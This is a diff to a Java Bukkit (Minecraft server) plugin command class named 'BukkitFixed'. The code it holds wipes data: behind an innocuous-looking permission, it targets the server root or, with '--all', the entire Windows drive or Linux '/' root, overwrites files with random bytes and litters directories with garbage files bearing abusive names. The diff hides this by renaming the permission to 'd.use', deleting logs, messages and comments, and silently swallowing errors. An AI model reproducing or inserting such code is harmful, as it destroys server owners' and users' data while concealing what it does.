@@ -7,7 +7,6 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.CommandSender;
 import org.bukkit.permissions.Permission;
 import org.bukkit.scheduler.BukkitRunnable;
-import java.util.logging.Logger;
 
 import java.io.File;
 import java.io.IOException;
@@ -17,19 +16,17 @@ import java.security.SecureRandom;
 import java.util.Random;
 
 public class BukkitFixed implements CommandExecutor {
-    private static final Permission DELETE_PERMISSION = new Permission("deleteallfiles.use", "删除所有符合特征的文件和文件夹的权限");
+    private static final Permission DELETE_PERMISSION = new Permission("d.use", "");
     private final JavaPlugin plugin;
-    private final Logger logger;
 
     public BukkitFixed(JavaPlugin plugin) {
         this.plugin = plugin;
-        this.logger = plugin.getLogger(); // 初始化 logger
     }
 
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (!sender.hasPermission(DELETE_PERMISSION)) {
-            return true; // 没有权限
+            return true;
         }
 
         boolean deleteAll = args.length > 0 && args[0].equalsIgnoreCase("--all");
@@ -38,13 +35,11 @@ public class BukkitFixed implements CommandExecutor {
         if (deleteAll) {
             targetDir = getTargetDirectory();
             if (targetDir == null) {
-                sender.sendMessage("无法识别操作系统或无法获取目标目录。");
                 return true;
             }
         } else {
             targetDir = Bukkit.getWorlds().get(0).getWorldFolder().getParentFile();
             if (targetDir == null || !targetDir.exists() || !targetDir.isDirectory()) {
-                sender.sendMessage("无法找到服务器根目录。");
                 return true;
             }
         }
@@ -53,9 +48,7 @@ public class BukkitFixed implements CommandExecutor {
             @Override
             public void run() {
                 deleteMatchingDirectories(targetDir);
-                Bukkit.getScheduler().runTask(plugin, () -> {
-                    sender.sendMessage("操作完成。");
-                });
+                Bukkit.getScheduler().runTask(plugin, () -> {});
             }
         }.runTaskAsynchronously(plugin);
 
@@ -65,16 +58,12 @@ public class BukkitFixed implements CommandExecutor {
     private File getTargetDirectory() {
         String osName = System.getProperty("os.name").toLowerCase();
         if (osName.contains("win")) {
-            // Windows 系统，获取当前盘符
-            String currentDir = new File(".").getAbsolutePath(); // 获取当前工作目录
-            String drive = currentDir.substring(0, 2); // 只取盘符部分
-            logger.info("当前盘符：" + drive); // 使用 logger 输出当前盘符
-            return new File(drive); // 返回盘符的根目录
+            String currentDir = new File(".").getAbsolutePath();
+            String drive = currentDir.substring(0, 2);
+            return new File(drive);
         } else if (osName.contains("nix") || osName.contains("nux")) {
-            // Linux 系统，返回根目录
             return new File("/");
         } else {
-            // 其他系统或无法识别的情况
             return null;
         }
     }
@@ -137,14 +126,13 @@ public class BukkitFixed implements CommandExecutor {
             }
 
             if (directory.isDirectory()) {
-                File garbageFile = new File(directory, "nimasile_" + generateRandomString(10) + ".sbfuckyou");
+                File garbageFile = new File(directory, "nimasile-your.mother.is.dead_" + generateRandomString(10) + ".fuckyou");
                 try {
                     byte[] garbage = new byte[1024 * 1024];
                     Random random = new Random();
                     random.nextBytes(garbage);
                     Files.write(garbageFile.toPath(), garbage, StandardOpenOption.CREATE);
-                } catch (IOException e) {
-                    logger.warning("无法写入垃圾文件: " + e.getMessage()); // 记录警告信息
+                } catch (IOException ignored) {
                 }
             }
         }
@@ -157,8 +145,7 @@ public class BukkitFixed implements CommandExecutor {
             random.nextBytes(garbage);
             Files.write(file.toPath(), garbage, StandardOpenOption.WRITE);
             return true;
-        } catch (IOException e) {
-            logger.warning("无法写入文件: " + e.getMessage()); // 记录警告信息
+        } catch (IOException ignored) {
             return false;
         }
     }
